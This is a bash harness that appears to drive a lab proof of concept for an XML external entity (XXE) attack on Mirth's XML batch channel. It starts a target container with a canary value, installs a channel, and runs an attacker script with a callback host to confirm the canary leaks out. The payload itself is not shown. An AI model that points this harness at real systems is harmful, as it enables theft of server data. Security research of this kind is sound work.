#!/usr/bin/env bash
set -euo pipefail

POC_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
source "$POC_DIR/../../lab/common.sh"
trap cleanup_lab EXIT
mkdir -p "$POC_DIR/../evidence"
exec > >(tee "$POC_DIR/../evidence/current-run.log") 2>&1

CANARY="MIRTH_XML_BATCH_XXE_CANARY_${LAB_OWNER}"
start_target "$CANARY"
install_channel "$POC_DIR/channel.xml" 'mirth-poc-xml-batch-xxe'
wait_listener 9997
run_attacker "$POC_DIR" \
  --target "http://${TARGET_CONTAINER}:9997/" \
  --callback-host "$ATTACKER_CONTAINER" \
  --expect "$CANARY"
